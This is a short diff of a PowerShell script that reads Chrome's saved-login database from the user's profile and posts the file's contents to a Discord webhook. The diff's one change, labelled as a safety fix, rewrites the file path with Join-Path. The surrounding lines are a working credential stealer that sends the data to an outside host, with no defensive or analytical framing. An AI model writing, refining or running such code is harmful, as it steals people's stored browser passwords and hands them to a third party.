@@ -1,5 +1,5 @@
-# Set the path to your file
-$filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+# Set the path to your file using Join-Path for safety
+$filePath = Join-Path $env:USERPROFILE "AppData\Local\Google\Chrome\User Data\Default\Login Data"
 
 # Check if the file exists
 if (-Not (Test-Path $filePath)) {
@@ -22,4 +22,3 @@ $payload = @{
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
 
 Write-Host "File content sent to Discord webhook."
-
